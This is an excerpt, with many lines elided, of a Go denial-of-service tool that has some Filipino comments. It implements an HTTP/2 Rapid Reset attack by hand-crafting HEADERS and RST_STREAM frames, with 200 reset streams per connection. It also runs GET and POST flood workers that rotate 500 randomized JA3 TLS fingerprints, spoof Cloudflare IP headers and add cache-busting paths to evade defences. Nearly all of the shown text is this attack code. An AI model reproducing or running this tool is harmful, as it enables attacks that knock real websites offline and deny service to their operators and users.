...
var (
	...
	// ADDED BACK: Security headers from Python file
	...
	// ADDED BACK: Modern browser headers from Python file
	...
	// ADDED BACK: Cloudflare IP ranges for spoofing
	...
	// ADDED BACK: Provider-specific headers
	...
	// ADDED BACK: Application headers
...
// ========== NEW: Connection Pool for JA3 Randomization ==========
...
// Create single client with random JA3
...
// ADDED BACK: Get random TLS profile (kept for compatibility with rapidResetWorker)
...
// ========== FIXED: HTTP/2 Rapid Reset Attack Worker ==========
func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	...
	for {
		...
		case <-done:
			return
		default:
			// Create new connection with random JA3 signature
			...
			// Read server's SETTINGS frame (required for proper HTTP/2)
			...
			// Generate random path for each connection
			basePath := "/" + randomString(randInt(5, 15))

			// Send multiple rapid reset streams (increase to 200 per connection)
			for i := 0; i < 200; i++ {
				select {
				case <-done:
					conn.Close()
...
// Build valid HTTP/2 HEADERS frame with HPACK encoding
func buildValidHeadersFrame(streamID uint32, host, path string) []byte {
	// HPACK encoded headers
	// :method = GET (0x82)
	// :scheme = https (0x84) or http
	// :path = literal
	// :authority = literal

	scheme := byte(0x84) // https
	...
	hpackData := []byte{
		0x82,       // :method GET
		scheme,     // :scheme
		0x86,       // :path (literal header)
	}

	// Add path as literal string
	pathBytes := []byte(path)
	hpackData = append(hpackData, byte(len(pathBytes)))
	hpackData = append(hpackData, pathBytes...)

	// Add :authority header (indexed)
	hpackData = append(hpackData, 0x87) // :authority
...
func buildRSTStreamFrame(streamID uint32) []byte {
	frame := make([]byte, 13)
	frame[0] = 0x00 // length high
	frame[1] = 0x00 // length mid
	frame[2] = 0x04 // length low = 4
	frame[3] = 0x03 // type = RST_STREAM
	frame[4] = 0x00 // flags
	frame[5] = byte(streamID >> 24)
	frame[6] = byte(streamID >> 16)
	frame[7] = byte(streamID >> 8)
...
// Alternative simplified rapid reset using standard library (more reliable)
func rapidResetWorkerAlt(targetURL string, done chan struct{}, stats *atomicCounter) {
	client := &http.Client{
	...
	for {
		...
		default:
			...
			req, err := http.NewRequestWithContext(ctx, "GET", targetURL+generateAdvancedPath()+generateCacheBustParams(), nil)
			if err != nil {
				cancel()
			...
			// Cancel immediately to trigger RST_STREAM
			go func() {
...
// Generate Cloudflare IP for spoofing
...
// Generate request body for POST
...
// ========== PAGBABAGO #1: PINALAKI ANG PAYLOAD SIZE ==========
...
func main() {
	...
	// ========== NEW: Create connection pool for JA3 randomization ==========
	poolSize := 500 // 500 unique JA3 fingerprints
	...
	// If HTTP/2 is supported, use workers for Rapid Reset
	if h2Supported && mode == "GET" {
		...
		// Start Rapid Reset workers (using the fixed version)
		...
		// Start normal flood workers with connection pool
		...
		// Normal flood only with connection pool
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
...
// UPDATED: attackWorker with connection pool for JA3 randomization
// MAY MGA PAGBABAGO: Chunked encoding, 5 POSTs per connection, Student Number
func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		...
		case <-done:
			return
		default:
			// Get client from pool (each has unique JA3 fingerprint)
			...
			if mode == "GET" {
				...
				// ========== PAGBABAGO: STUDENT NUMBER PAYLOAD ==========
			...
			// ========== PAGBABAGO #3: 5 POSTS PER CONNECTION ==========
			if mode == "POST" {
				for i := 0; i < 5; i++ {
					resp, err := client.Do(req)
					if err == nil {
